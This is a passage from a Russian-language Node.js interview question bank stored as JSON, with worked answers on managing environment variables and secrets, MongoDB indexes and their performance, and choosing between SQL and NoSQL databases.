проекта)\nNODE_ENV=development\nPORT=3000\nDB_HOST=localhost\nDB_PORT=5432\nDB_NAME=myapp\nDB_USER=postgres\nDB_PASSWORD=secret123\n\nJWT_SECRET=your-super-secret-key-change-in-production\nJWT_EXPIRES_IN=7d\n\nSMTP_HOST=smtp.gmail.com\nSMTP_PORT=587\nSMTP_USER=your-email@gmail.com\nSMTP_PASSWORD=your-app-password\n\nAPI_KEY=sk-1234567890abcdef\nSTRIPE_SECRET_KEY=sk_test_51234567890\n\nREDIS_URL=redis://localhost:6379\n```\n\n```javascript\n// app.js\nrequire('dotenv').config();\n\n// Теперь доступны через process.env\nconsole.log(process.env.DB_HOST);     // 'localhost'\nconsole.log(process.env.JWT_SECRET);  // 'your-super-secret-key...'\n\n// Подключение к БД\nconst db = {\n  host: process.env.DB_HOST,\n  port: parseInt(process.env.DB_PORT),\n  database: process.env.DB_NAME,\n  user: process.env.DB_USER,\n  password: process.env.DB_PASSWORD\n};\n```\n\n**Различные .env файлы для окружений:**\n\n```javascript\n// .env.development\nNODE_ENV=development\nDB_HOST=localhost\nDB_PORT=5432\nDB_NAME=myapp_dev\nAPI_URL=http://localhost:3000\n\n// .env.production\nNODE_ENV=production\nDB_HOST=production-db.example.com\nDB_PORT=5432\nDB_NAME=myapp_prod\nAPI_URL=https://api.example.com\n\n// .env.test\nNODE_ENV=test\nDB_HOST=localhost\nDB_PORT=5432\nDB_NAME=myapp_test\n```\n\n```javascript\n// config/env.js\nconst path = require('path');\nconst dotenv = require('dotenv');\n\n// Определяем какой .env файл загружать\nconst envFile = `.env.${process.env.NODE_ENV || 'development'}`;\n\n// Загружаем соответствующий .env\ndotenv.config({ path: path.resolve(process.cwd(), envFile) });\n\nmodule.exports = {\n  env: process.env.NODE_ENV,\n  port: parseInt(process.env.PORT, 10),\n  database: {\n    host: process.env.DB_HOST,\n    port: parseInt(process.env.DB_PORT, 10),\n    name: process.env.DB_NAME,\n    user: process.env.DB_USER,\n    password: process.env.DB_PASSWORD\n  },\n  jwt: {\n    secret: process.env.JWT_SECRET,\n    expiresIn: process.env.JWT_EXPIRES_IN\n  },\n  smtp: {\n    host: process.env.SMTP_HOST,\n    port: parseInt(process.env.SMTP_PORT, 10),\n    user: process.env.SMTP_USER,\n    password: process.env.SMTP_PASSWORD\n  }\n};\n```\n\n**Валидация environment variables:**\n\n```javascript\n// config/validate-env.js\nfunction validateEnv() {\n  const required = [\n    'NODE_ENV',\n    'PORT',\n    'DB_HOST',\n    'DB_PORT',\n    'DB_NAME',\n    'DB_USER',\n    'DB_PASSWORD',\n    'JWT_SECRET'\n  ];\n\n  const missing = required.filter(key => !process.env[key]);\n\n  if (missing.length > 0) {\n    throw new Error(`Missing required environment variables: ${missing.join(', ')}`);\n  }\n\n  // Проверка значений\n  if (process.env.NODE_ENV !== 'development' &&\n      process.env.NODE_ENV !== 'production' &&\n      process.env.NODE_ENV !== 'test') {\n    throw new Error('NODE_ENV must be development, production, or test');\n  }\n\n  if (isNaN(parseInt(process.env.PORT))) {\n    throw new Error('PORT must be a number');\n  }\n\n  if (process.env.JWT_SECRET.length < 32) {\n    throw new Error('JWT_SECRET must be at least 32 characters');\n  }\n}\n\nmodule.exports = validateEnv;\n```\n\n```javascript\n// app.js\nrequire('dotenv').config();\nconst validateEnv = require('./config/validate-env');\n\n// Валидация перед запуском приложения\nvalidateEnv();\n\nconst app = express();\n// ...\n```\n\n**Использование библиотеки envalid (строгая типизация):**\n\n```bash\nnpm install envalid\n```\n\n```javascript\nconst { cleanEnv, str, port, email, url } = require('envalid');\n\nconst env = cleanEnv(process.env, {\n  NODE_ENV: str({ choices: ['development', 'test', 'production'] }),\n  PORT: port({ default: 3000 }),\n  DB_HOST: str(),\n  DB_PORT: port({ default: 5432 }),\n  DB_NAME: str(),\n  DB_USER: str(),\n  DB_PASSWORD: str(),\n  JWT_SECRET: str({ minLength: 32 }),\n  SMTP_HOST: str(),\n  SMTP_USER: email(),\n  API_URL: url()\n});\n\n// Теперь env строго типизирован и валидирован\nconsole.log(env.PORT);      // number (не string!)\nconsole.log(env.DB_HOST);   // string\nconsole.log(env.API_URL);   // URL (валидирован)\n\nmodule.exports = env;\n```\n\n**Best Practices для секретов:**\n\n**1. НЕ коммитьте .env файлы в git**\n\n```gitignore\n# .gitignore\n.env\n.env.local\n.env.*.local\n.env.development\n.env.production\n```\n\n**2. Создайте .env.example (template без секретов):**\n\n```bash\n# .env.example\nNODE_ENV=development\nPORT=3000\nDB_HOST=localhost\nDB_PORT=5432\nDB_NAME=myapp\nDB_USER=\nDB_PASSWORD=\n\nJWT_SECRET=change-this-to-a-secure-random-string-at-least-32-chars\nJWT_EXPIRES_IN=7d\n\nSMTP_HOST=\nSMTP_PORT=587\nSMTP_USER=\nSMTP_PASSWORD=\n\nAPI_KEY=\n```\n\n**3. Используйте менеджеры секретов для production:**\n\n```javascript\n// AWS Secrets Manager\nconst AWS = require('aws-sdk');\nconst secretsManager = new AWS.SecretsManager({ region: 'us-east-1' });\n\nasync function getSecret(secretName) {\n  const data = await secretsManager.getSecretValue({ SecretId: secretName }).promise();\n  return JSON.parse(data.SecretString);\n}\n\n// Загрузка секретов при старте приложения\nasync function loadSecrets() {\n  const secrets = await getSecret('myapp/production/database');\n\n  process.env.DB_HOST = secrets.host;\n  process.env.DB_PASSWORD = secrets.password;\n  // ...\n}\n\nloadSecrets().then(() => {\n  app.listen(process.env.PORT);\n});\n```\n\n**4. Используйте Docker secrets (Docker Swarm/Kubernetes):**\n\n```yaml\n# docker-compose.yml\nversion: '3.8'\nservices:\n  app:\n    image: myapp:latest\n    secrets:\n      - db_password\n      - jwt_secret\n    environment:\n      DB_PASSWORD_FILE: /run/secrets/db_password\n      JWT_SECRET_FILE: /run/secrets/jwt_secret\n\nsecrets:\n  db_password:\n    external: true\n  jwt_secret:\n    external: true\n```\n\n```javascript\n// Чтение secrets из файлов\nconst fs = require('fs');\n\nfunction readSecretFromFile(envVar) {\n  const fileEnvVar = `${envVar}_FILE`;\n\n  if (process.env[fileEnvVar]) {\n    return fs.readFileSync(process.env[fileEnvVar], 'utf8').trim();\n  }\n\n  return process.env[envVar];\n}\n\nconst dbPassword = readSecretFromFile('DB_PASSWORD');\nconst jwtSecret = readSecretFromFile('JWT_SECRET');\n```\n\n**5. Ротация секретов:**\n\n```javascript\n// Graceful reload при изменении секретов\nconst fs = require('fs');\nconst path = require('path');\n\nconst secretsPath = '/run/secrets';\nlet currentSecrets = {};\n\nfunction loadSecrets() {\n  const dbPassword = fs.readFileSync(path.join(secretsPath, 'db_password'), 'utf8').trim();\n  const jwtSecret = fs.readFileSync(path.join(secretsPath, 'jwt_secret'), 'utf8').trim();\n\n  return { dbPassword, jwtSecret };\n}\n\n// Проверка изменений каждые 5 минут\nsetInterval(() => {\n  try {\n    const newSecrets = loadSecrets();\n\n    // Сравниваем с текущими\n    if (newSecrets.dbPassword !== currentSecrets.dbPassword) {\n      console.log('DB password rotated, reconnecting...');\n      // Переподключение к БД с новым паролем\n      reconnectDatabase(newSecrets.dbPassword);\n    }\n\n    currentSecrets = newSecrets;\n  } catch (err) {\n    console.error('Failed to reload secrets:', err);\n  }\n}, 5 * 60 * 1000);\n```\n\n**6. Шифрование .env файлов:**\n\n```bash\n# Установка\nnpm install dotenv-vault\n\n# Шифрование .env\nnpx dotenv-vault encrypt\n\n# Генерирует .env.vault (зашифрованный)\n# Ключ дешифровки хранится отдельно (DOTENV_KEY)\n```\n\n```javascript\n// Использование\nrequire('dotenv-vault-core').config();\n\n// Работает так же, но .env зашифрован\nconsole.log(process.env.DB_PASSWORD);\n```\n\n**Чек-лист безопасности:**\n\n```javascript\n// ✅ Всегда используйте .env файлы для локальной разработки\n// ✅ Добавьте .env в .gitignore\n// ✅ Создайте .env.example с placeholder'ами\n// ✅ Валидируйте обязательные переменные при старте\n// ✅ Используйте менеджеры секретов в production (AWS Secrets Manager, HashiCorp Vault)\n// ✅ Ротируйте секреты регулярно\n// ✅ Используйте разные секреты для dev/staging/prod\n// ✅ Ограничьте доступ к production секретам (принцип least privilege)\n// ✅ Логируйте доступ к секретам (audit trail)\n// ✅ Используйте короткие TTL для токенов\n\n// ❌ НЕ коммитьте .env файлы в git\n// ❌ НЕ используйте одинаковые секреты для разных окружений\n// ❌ НЕ передавайте секреты через URL или query параметры\n// ❌ НЕ логируйте секреты в консоль или файлы\n// ❌ НЕ храните секреты в frontend коде (только backend)\n// ❌ НЕ используйте слабые секреты (минимум 32 символа для JWT_SECRET)\n```\n\n**Пример безопасной конфигурации:**\n\n```javascript\n// config/index.js\nrequire('dotenv').config();\nconst { cleanEnv, str, port } = require('envalid');\n\n// Валидация и типизация\nconst env = cleanEnv(process.env, {\n  NODE_ENV: str({ choices: ['development', 'test', 'production'] }),\n  PORT: port({ default: 3000 }),\n\n  DB_HOST: str(),\n  DB_PORT: port({ default: 5432 }),\n  DB_NAME: str(),\n  DB_USER: str(),\n  DB_PASSWORD: str(),\n\n  JWT_SECRET: str({ minLength: 32 }),\n  JWT_EXPIRES_IN: str({ default: '7d' }),\n\n  SMTP_HOST: str(),\n  SMTP_PORT: port({ default: 587 }),\n  SMTP_USER: str(),\n  SMTP_PASSWORD: str(),\n\n  REDIS_URL: str({ default: 'redis://localhost:6379' }),\n\n  // Feature flags\n  ENABLE_ANALYTICS: str({ choices: ['true', 'false'], default: 'false' }),\n  ENABLE_CACHING: str({ choices: ['true', 'false'], default: 'true' })\n});\n\n// Экспорт типизированной конфигурации\nmodule.exports = {\n  env: env.NODE_ENV,\n  port: env.PORT,\n\n  database: {\n    host: env.DB_HOST,\n    port: env.DB_PORT,\n    name: env.DB_NAME,\n    user: env.DB_USER,\n    password: env.DB_PASSWORD,\n    // НЕ экспортируем пароль напрямую, только внутри database объекта\n  },\n\n  jwt: {\n    secret: env.JWT_SECRET,\n    expiresIn: env.JWT_EXPIRES_IN\n  },\n\n  smtp: {\n    host: env.SMTP_HOST,\n    port: env.SMTP_PORT,\n    auth: {\n      user: env.SMTP_USER,\n      pass: env.SMTP_PASSWORD\n    }\n  },\n\n  redis: {\n    url: env.REDIS_URL\n  },\n\n  features: {\n    analytics: env.ENABLE_ANALYTICS === 'true',\n    caching: env.ENABLE_CACHING === 'true'\n  }\n};\n```\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 48,
          "question_number_in_chapter": 10,
          "question_chapter": 6,
          "question_title": "Что такое индексы в MongoDB? Как они влияют на производительность?",
          "answer_markdown": "\n**Ответ:**\n\n**Индексы в MongoDB** - это специальные структуры данных, которые хранят небольшую часть данных коллекции в упорядоченном виде для быстрого поиска.\n\n**Зачем нужны индексы:**\n\n1. **Ускорение поиска** - без индекса MongoDB сканирует всю коллекцию (Collection Scan)\n2. **Сортировка** - индексы позволяют эффективно сортировать результаты\n3. **Уникальность** - гарантия уникальных значений\n4. **Текстовый поиск** - полнотекстовый поиск\n5. **Геопространственные запросы** - поиск по координатам\n\n**Типы индексов:**\n\n```javascript\nconst mongoose = require('mongoose');\n\n// 1. Single Field Index (индекс по одному полю)\nuserSchema.index({ email: 1 });  // 1 = ascending, -1 = descending\n\n// 2. Compound Index (составной индекс)\nuserSchema.index({ lastName: 1, firstName: 1 });\n\n// 3. Unique Index (уникальный индекс)\nuserSchema.index({ email: 1 }, { unique: true });\n\n// 4. Sparse Index (разреженный индекс, только для документов с этим полем)\nuserSchema.index({ phone: 1 }, { sparse: true });\n\n// 5. TTL Index (Time To Live, автоудаление документов)\nsessionSchema.index({ createdAt: 1 }, { expireAfterSeconds: 3600 });  // удаление через 1 час\n\n// 6. Text Index (полнотекстовый поиск)\narticleSchema.index({ title: 'text', content: 'text' });\n\n// 7. Geospatial Index (геопространственный индекс)\nlocationSchema.index({ coordinates: '2dsphere' });\n\n// 8. Hashed Index (хешированный индекс для шардирования)\nuserSchema.index({ userId: 'hashed' });\n```\n\n**Создание индексов:**\n\n```javascript\n// Mongoose схема\nconst userSchema = new mongoose.Schema({\n  email: {\n    type: String,\n    required: true,\n    unique: true,  // автоматически создает уникальный индекс\n    lowercase: true,\n    trim: true,\n    index: true    // создает обычный индекс\n  },\n  username: {\n    type: String,\n    required: true,\n    unique: true\n  },\n  firstName: String,\n  lastName: String,\n  age: Number,\n  city: String,\n  createdAt: {\n    type: Date,\n    default: Date.now\n  }\n});\n\n// Составные индексы\nuserSchema.index({ lastName: 1, firstName: 1 });\nuserSchema.index({ city: 1, age: -1 });\n\n// TTL индекс для временных данных\nuserSchema.index({ createdAt: 1 }, { expireAfterSeconds: 86400 });  // удаление через 24 часа\n\nconst User = mongoose.model('User', userSchema);\n```\n\n**Создание индексов через MongoDB shell:**\n\n```javascript\n// Native MongoDB driver\nconst { MongoClient } = require('mongodb');\n\nasync function createIndexes() {\n  const client = await MongoClient.connect('mongodb://localhost:27017');\n  const db = client.db('myapp');\n  const users = db.collection('users');\n\n  // Single field index\n  await users.createIndex({ email: 1 }, { unique: true });\n\n  // Compound index\n  await users.createIndex({ lastName: 1, firstName: 1 });\n\n  // Text index\n  await users.createIndex({ bio: 'text', interests: 'text' });\n\n  // Partial index (индекс только для части документов)\n  await users.createIndex(\n    { city: 1 },\n    { partialFilterExpression: { age: { $gte: 18 } } }\n  );\n\n  client.close();\n}\n```\n\n**Анализ производительности запросов (explain):**\n\n```javascript\n// Без индекса - Collection Scan (медленно)\nconst result = await User.find({ email: 'john@example.com' }).explain('executionStats');\n\nconsole.log(result.executionStats);\n// {\n//   executionTimeMillis: 150,\n//   totalDocsExamined: 1000000,  // ❌ Проверили все 1млн документов!\n//   nReturned: 1,\n//   executionStages: {\n//     stage: 'COLLSCAN'  // ❌ Collection Scan - плохо!\n//   }\n// }\n\n// С индексом - Index Scan (быстро)\nawait User.createIndex({ email: 1 });\n\nconst result2 = await User.find({ email: 'john@example.com' }).explain('executionStats');\n\nconsole.log(result2.executionStats);\n// {\n//   executionTimeMillis: 2,  // ✅ Быстро!\n//   totalDocsExamined: 1,    // ✅ Проверили только 1 документ\n//   nReturned: 1,\n//   executionStages: {\n//     stage: 'FETCH',\n//     inputStage: {\n//       stage: 'IXSCAN',  // ✅ Index Scan - отлично!\n//       keyPattern: { email: 1 }\n//     }\n//   }\n// }\n```\n\n**Влияние индексов на производительность:**\n\n**✅ Плюсы:**\n\n1. **Ускорение чтения** - запросы выполняются в разы быстрее\n2. **Эффективная сортировка** - сортировка без загрузки всех данных\n3. **Уникальность** - автоматическая проверка уникальности\n\n```javascript\n// Пример: поиск пользователей по городу и возрасту\nuserSchema.index({ city: 1, age: -1 });\n\n// Быстрый запрос благодаря индексу\nconst users = await User.find({ city: 'Moscow', age: { $gte: 25 } })\n  .sort({ age: -1 })\n  .limit(10);\n\n// explain показывает:\n// executionTimeMillis: 5ms (вместо 500ms без индекса)\n// totalDocsExamined: 10 (вместо 1000000)\n```\n\n**❌ Минусы:**\n\n1. **Замедление записи** - каждая операция INSERT/UPDATE/DELETE обновляет индексы\n2. **Использование памяти** - индексы занимают RAM и дисковое пространство\n3. **Время создания** - создание индекса на большой коллекции может занять часы\n\n```javascript\n// Пример: измерение влияния на запись\nconsole.time('Insert without indexes');\nawait User.insertMany(generateUsers(10000));\nconsole.timeEnd('Insert without indexes');\n// Insert without indexes: 250ms\n\n// Создаем 5 индексов\nawait User.createIndex({ email: 1 });\nawait User.createIndex({ username: 1 });\nawait User.createIndex({ lastName: 1, firstName: 1 });\nawait User.createIndex({ city: 1, age: -1 });\nawait User.createIndex({ createdAt: 1 });\n\nconsole.time('Insert with indexes');\nawait User.insertMany(generateUsers(10000));\nconsole.timeEnd('Insert with indexes');\n// Insert with indexes: 450ms  ❌ Почти в 2 раза медленнее!\n```\n\n**Best Practices для индексов:**\n\n**1. Создавайте индексы для частых запросов:**\n\n```javascript\n// ✅ Хорошо: индекс для частого запроса\nuserSchema.index({ email: 1 });\nawait User.find({ email: 'john@example.com' });  // Быстро\n\n// ❌ Плохо: индекс для редкого запроса (расход памяти)\nuserSchema.index({ lastLoginIP: 1 });  // Используется раз в месяц\n```\n\n**2. Используйте compound indexes для multiple field queries:**\n\n```javascript\n// ✅ Хорошо: составной индекс\nuserSchema.index({ city: 1, age: -1, status: 1 });\n\n// Эффективные запросы:\nawait User.find({ city: 'Moscow' });\nawait User.find({ city: 'Moscow', age: { $gte: 25 } });\nawait User.find({ city: 'Moscow', age: { $gte: 25 }, status: 'active' });\n\n// ❌ Плохо: отдельные индексы для каждого поля (неэффективно)\nuserSchema.index({ city: 1 });\nuserSchema.index({ age: 1 });\nuserSchema.index({ status: 1 });\n```\n\n**3. Порядок полей в compound index важен (ESR правило):**\n\n**ESR = Equality, Sort, Range**\n\n```javascript\n// ✅ Правильный порядок: Equality → Sort → Range\nuserSchema.index({ status: 1, createdAt: -1, age: 1 });\n\nawait User.find({\n  status: 'active',        // Equality (=)\n  age: { $gte: 25 }       // Range (>, <, >=, <=)\n}).sort({ createdAt: -1 });  // Sort\n\n// ❌ Неправильный порядок\nuserSchema.index({ age: 1, createdAt: -1, status: 1 });  // Менее эффективно\n```\n\n**4. Используйте покрывающие индексы (Covered Queries):**\n\n```javascript\n// Покрывающий индекс содержит ВСЕ поля из query и projection\nuserSchema.index({ email: 1, firstName: 1, lastName: 1 });\n\n// ✅ Covered Query - данные берутся только из индекса (очень быстро!)\nconst users = await User.find(\n  { email: 'john@example.com' },\n  { _id: 0, firstName: 1, lastName: 1 }  // projection только из индекса\n);\n\n// MongoDB НЕ читает документы, только индекс!\n// executionStages.stage === 'IXSCAN' (без 'FETCH')\n```\n\n**5. Мониторинг использования индексов:**\n\n```javascript\n// Проверка неиспользуемых индексов\nconst indexStats = await User.collection.aggregate([\n  { $indexStats: {} }\n]).toArray();\n\nconsole.log(indexStats);\n// [\n//   { name: 'email_1', accesses: { ops: 15000, since: ... } },  // ✅ Активно используется\n//   { name: 'phone_1', accesses: { ops: 5, since: ... } },      // ❌ Почти не используется\n// ]\n\n// Удаление неиспользуемых индексов\nawait User.collection.dropIndex('phone_1');\n```\n\n**6. Partial Indexes (частичные индексы) для оптимизации:**\n\n```javascript\n// Индекс только для активных пользователей\nuserSchema.index(\n  { email: 1 },\n  {\n    partialFilterExpression: { status: 'active' }\n  }\n);\n\n// Экономия памяти: индекс только для 10% документов (активных пользователей)\n// вместо 100% всех пользователей\n```\n\n**7. Background index creation:**\n\n```javascript\n// Создание индекса в фоне (не блокирует запись)\nawait User.collection.createIndex(\n  { email: 1 },\n  { background: true }  // ✅ Не блокирует другие операции\n);\n\n// Mongoose автоматически создает индексы при старте\n// Отключите в production для контроля:\nmongoose.connect(uri, {\n  autoIndex: false  // Создавайте индексы вручную\n});\n```\n\n**Пример оптимизации реального приложения:**\n\n```javascript\n// БЫЛО: медленный поиск пользователей\nconst users = await User.find({\n  city: 'Moscow',\n  age: { $gte: 25, $lte: 40 },\n  status: 'active'\n}).sort({ createdAt: -1 }).limit(20);\n\n// executionTimeMillis: 1500ms\n// totalDocsExamined: 500000\n\n// СТАЛО: добавили compound index\nuserSchema.index({ city: 1, status: 1, createdAt: -1, age: 1 });\n\n// executionTimeMillis: 8ms  ✅ В 187 раз быстрее!\n// totalDocsExamined: 20     ✅ Проверили только нужные документы\n```\n\n**Чек-лист для индексов:**\n\n```javascript\n// ✅ Создавайте индексы для полей в WHERE/find()\n// ✅ Создавайте индексы для полей в sort()\n// ✅ Используйте compound indexes для multi-field queries\n// ✅ Следуйте ESR правилу (Equality, Sort, Range)\n// ✅ Используйте unique indexes для уникальных полей (email, username)\n// ✅ Используйте sparse indexes для опциональных полей\n// ✅ Используйте partial indexes для подмножества документов\n// ✅ Мониторьте использование индексов ($indexStats)\n// ✅ Удаляйте неиспользуемые индексы\n// ✅ Используйте explain() для анализа запросов\n\n// ❌ НЕ создавайте индексы для полей, которые редко запрашиваются\n// ❌ НЕ создавайте избыточные индексы (дубликаты)\n// ❌ НЕ индексируйте поля с низкой селективностью (boolean, пол)\n// ❌ НЕ создавайте слишком много индексов (замедляет запись)\n// ❌ НЕ создавайте индексы в production без тестирования\n```\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 49,
          "question_number_in_chapter": 11,
          "question_chapter": 6,
          "question_title": "В чем разница между SQL и NoSQL? Когда что использовать?",
          "answer_markdown": "\n**Ответ:**\n\n**SQL (Relational Databases)** - реляционные базы данных с жесткой схемой и связями между таблицами.\n**Примеры:** PostgreSQL, MySQL, Oracle, SQL Server, SQLite\n\n**NoSQL (Non-Relational Databases)** - нереляционные базы данных с гибкой схемой.\n**Примеры:** MongoDB (Document), Redis (Key-Value), Cassandra (Column-Family), Neo4j (Graph)\n\n**Основные отличия:**\n\n| Характеристика | SQL | NoSQL |\n|---|---|---|\n| **Схема данных** | Жесткая (schema) | Гибкая (schemaless) |\n| **Структура** | Таблицы, строки, столбцы | Документы, ключ-значение, графы, колонки |\n| **Масштабирование** | Вертикальное (scale-up) | Горизонтальное (scale-out) |\n| **ACID транзакции** | ✅ Полная поддержка | ⚠️ Частичная/отсутствует (BASE) |\n| **Связи между данными** | JOIN (Foreign Keys) | Денормализация, вложенные документы |\n| **Язык запросов** | SQL (стандартизирован) | Специфичен для каждой БД |\n| **Консистентность** | Сильная (Strong) | Eventual (в распределенных системах) |\n| **Производительность чтения** | Медленнее (JOIN) | Быстрее (денормализация) |\n| **Производительность записи** | Медленнее (транзакции) | Быстрее |\n| **Подходит для** | Сложные связи, финансы, OLTP | Большие объемы, real-time, гибкие схемы |\n\n**SQL (PostgreSQL) пример:**\n\n```sql\n-- Таблица пользователей\nCREATE TABLE users (\n  id SERIAL PRIMARY KEY,\n  email VARCHAR(255) UNIQUE NOT NULL,\n  username VARCHAR(100) UNIQUE NOT NULL,\n  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\n-- Таблица постов\nCREATE TABLE posts (\n  id SERIAL PRIMARY KEY,\n  user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,\n  title VARCHAR(255) NOT NULL,\n  content TEXT,\n  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\n-- Таблица комментариев\nCREATE TABLE comments (\n  id SERIAL PRIMARY KEY,\n  post_id INTEGER REFERENCES posts(id) ON DELETE CASCADE,\n  user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,\n  text TEXT NOT NULL,\n  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\n-- Запрос с JOIN\nSELECT\n  u.username,\n  p.title,\n  c.text,\n  c.created_at\nFROM comments c\nJOIN posts p ON c.post_id = p.id\nJOIN users u ON c.user_id = u.id\nWHERE p.id = 123\nORDER BY c.created_at DESC;\n```\n\n```javascript\n// Node.js + PostgreSQL (pg)\nconst { Pool } = require('pg');\n\nconst pool = new Pool({\n  host: 'localhost',\n  database: 'myapp',\n  user: 'postgres',\n  password: 'password'\n});\n\n// Транзакция (ACID)\nasync function transferMoney(fromUserId, toUserId, amount) {\n  const client = await pool.connect();\n\n  try {\n    await client.query('BEGIN');\n\n    // Снимаем деньги с одного счета\n    await client.query(\n      'UPDATE accounts SET balance = balance - $1 WHERE user_id = $2',\n      [amount, fromUserId]\n    );\n\n    // Добавляем на другой счет\n    await client.query(\n      'UPDATE accounts SET balance = balance + $1 WHERE user_id = $2',\n      [amount, toUserId]\n    );\n\n    await client.query('COMMIT');\n  } catch (err) {\n    await client.query('ROLLBACK');\n    throw err;\n  } finally {\n    client.release();\n  }\n}\n```\n\n**NoSQL (MongoDB) пример:**\n\n```javascript\n// Документ пользователя (все данные в одном месте)\n{\n  _id: ObjectId(\"507f1f77bcf86cd799439011\"),\n  email: \"john@example.com\",\n  username: \"johndoe\",\n  profile: {\n    firstName: \"John\",\n    lastName: \"Doe\",\n    avatar: \"https://example.com/avatar.jpg\"\n  },\n  posts: [\n    {\n      _id: ObjectId(\"507f1f77bcf86cd799439012\"),\n      title: \"My First Post\",\n      content: \"Hello World!\",\n      comments: [\n        {\n          _id: ObjectId(\"507f1f77bcf86cd799439013\"),\n          userId: ObjectId(\"507f1f77bcf86cd799439014\"),\n          username: \"jane\",\n          text: \"Great post!\",\n          createdAt: ISODate(\"2024-01-15T10:30:00Z\")\n        }\n      ],\n      createdAt: ISODate(\"2024-01-15T09:00:00Z\")\n    }\n  ],\n  createdAt: ISODate(\"2024-01-01T12:00:00Z\")\n}\n```\n\n```javascript\n// Node.js + MongoDB (Mongoose)\nconst mongoose = require('mongoose');\n\nconst postSchema = new mongoose.Schema({\n  userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User' },\n  title: String,\n  content: String,\n  comments: [{\n    userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User' },\n    text: String,\n    createdAt: { type: Date, default: Date.now }\n  }],\n  createdAt: { type: Date, default: Date.now }\n});\n\nconst Post = mongoose.model('Post', postSchema);\n\n// Получение поста с комментариями (один запрос, без JOIN)\nconst post = await Post.findById(postId);\nconsole.log(post.comments);  // Все комментарии уже в документе!\n\n// С populate (если используем ссылки):\nconst post = await Post.findById(postId).populate('userId').populate('comments.userId');\n```\n\n**Когда использовать SQL:**\n\n**✅ Используйте SQL если:**\n\n1. **Сложные связи между данными** (many-to-many, foreign keys)\n2. **ACID транзакции критичны** (финансы, банкинг, e-commerce)\n3. **Данные структурированы** и схема стабильна\n4. **Сложные запросы с JOIN** и агрегациями\n5. **Строгая консистентность** важнее производительности\n6. **Reporting и analytics** (OLAP)\n\n**Примеры:**\n- Банковские системы (переводы денег)\n- E-commerce (заказы, транзакции)\n- ERP системы (бухгалтерия, складской учет)\n- CRM системы (клиенты, контакты, сделки)\n- Социальные сети (сложные связи между пользователями)\n\n```javascript\n// Пример: E-commerce заказ (SQL лучше из-за транзакций)\nasync function createOrder(userId, items) {\n  const client = await pool.connect();\n\n  try {\n    await client.query('BEGIN');\n\n    // 1. Создаем заказ\n    const orderResult = await client.query(\n      'INSERT INTO orders (user_id, total, status) VALUES ($1, $2, $3) RETURNING id',\n      [userId, total, 'pending']\n    );\n    const orderId = orderResult.rows[0].id;\n\n    // 2. Добавляем товары в заказ\n    for (const item of items) {\n      await client.query(\n        'INSERT INTO order_items (order_id, product_id, quantity, price) VALUES ($1, $2, $3, $4)',\n        [orderId, item.productId, item.quantity, item.price]\n      );\n\n      // 3. Уменьшаем количество товара на складе\n      await client.query(\n        'UPDATE products SET stock = stock - $1 WHERE id = $2',\n        [item.quantity, item.productId]\n      );\n    }\n\n    // 4. Списываем деньги со счета\n    await client.query(\n      'UPDATE accounts SET balance = balance - $1 WHERE user_id = $2',\n      [total, userId]\n    );\n\n    await client.query('COMMIT');\n    // ✅ Либо все операции выполнены, либо ни одна (ACID)\n  } catch (err) {\n    await client.query('ROLLBACK');\n    throw err;\n  } finally {\n    client.release();\n  }\n}\n```\n\n**Когда использовать NoSQL:**\n\n**✅ Используйте NoSQL если:**\n\n1. **Гибкая схема** - данные часто меняются\n2. **Огромные объемы данных** (петабайты)\n3. **Горизонтальное масштабирование** критично\n4. **Высокая скорость чтения/записи** важнее консистентности\n5. **Денормализованные данные** (документы, JSON)\n6. **Real-time приложения** (чаты, игры, IoT)\n7. **Кеширование** (Redis)\n\n**Примеры:**\n- Социальные сети (посты, лайки, лента)\n- Real-time чаты и мессенджеры\n- IoT данные (логи, метрики, сенсоры)\n- Кеширование (Redis)\n- Content Management Systems (блоги, статьи)\n- Big Data и аналитика (Cassandra)\n\n```javascript\n// Пример: Блог (MongoDB лучше из-за гибкости)\nconst articleSchema = new mongoose.Schema({\n  title: String,\n  content: String,\n  author: {\n    _id: ObjectId,\n    username: String,\n    avatar: String\n  },\n  tags: [String],\n  comments: [{\n    userId: ObjectId,\n    username: String,\n    text: String,\n    createdAt: Date\n  }],\n  likes: [{ userId: ObjectId, createdAt: Date }],\n  views: Number,\n  metadata: {  // ✅ Гибкая схема - можем добавлять любые поля\n    seoTitle: String,\n    seoDescription: String,\n    canonicalUrl: String,\n    customField1: String  // Новое поле без миграции!\n  },\n  createdAt: { type: Date, default: Date.now },\n  updatedAt: { type: Date, default: Date.now }\n});\n\n// Получение статьи с комментариями (один запрос!)\nconst article = await Article.findById(articleId);\nconsole.log(article.comments);  // ✅ Быстро, без JOIN\n```\n\n**Гибридный подход (Polyglot Persistence):**\n\nСовременные приложения часто используют **несколько баз данных** одновременно:\n\n```javascript\n// PostgreSQL - для транзакций и сложных связей\nconst orders = await pool.query('SELECT * FROM orders WHERE user_id = $1', [userId]);\n\n// MongoDB - для контента и гибких данных\nconst articles = await Article.find({ author: userId });\n\n// Redis - для кеширования и real-time\nawait redis.set(`user:${userId}:session`, JSON.stringify(session), 'EX', 3600);\n\n// Elasticsearch - для полнотекстового поиска\nconst searchResults = await esClient.search({\n  index: 'articles',\n  body: {\n    query: {\n      multi_match: {\n        query: 'Node.js tutorial',\n        fields: ['title', 'content']\n      }\n    }\n  }\n});\n```\n\n**Пример реального приложения:**\n\n```javascript\n// E-commerce платформа (используем оба типа БД)\n\n// PostgreSQL - для критичных транзакций\n// - Заказы (orders)\n// - Платежи (payments)\n// - Инвентарь (inventory)\n// - Пользователи (users)\n\n// MongoDB - для гибкого контента\n// - Каталог товаров (products) - часто меняются поля\n// - Отзывы (reviews)\n// - История просмотров (view_history)\n\n// Redis - для кеширования и real-time\n// - Корзина (cart)\n// - Сессии (sessions)\n// - Rate limiting\n// - Real-time уведомления\n\nconst express = require('express');\nconst app = express();\n\n// Создание заказа (PostgreSQL транзакция)\napp.post('/orders', async (req, res) => {\n  const client = await pgPool.connect();\n  try {\n    await client.query('BEGIN');\n\n    const orderResult = await client.query(\n      'INSERT INTO orders (user_id, total) VALUES ($1, $2) RETURNING id',\n      